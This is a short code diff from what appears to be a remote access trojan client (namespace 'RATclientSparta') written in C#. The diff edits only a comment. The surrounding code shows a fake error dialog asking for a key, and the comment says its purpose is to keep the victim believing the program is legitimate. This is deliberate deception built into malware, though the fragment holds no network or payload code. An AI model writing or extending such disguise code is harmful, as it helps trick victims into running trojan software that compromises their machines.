@@ -96,7 +96,7 @@ namespace RATclientSparta
                 }
                 else
                 {
-                    //User opened the program again, at this point he will keep thinking app is legit.
+                    //User opened the program again, at this point he will keep thinking app is legit. (Fake error message)
                     MessageBox.Show("Error: please enter the key to use this program." + Environment.NewLine + "Error ID: 45771 (No key entered)");
                 }
             }
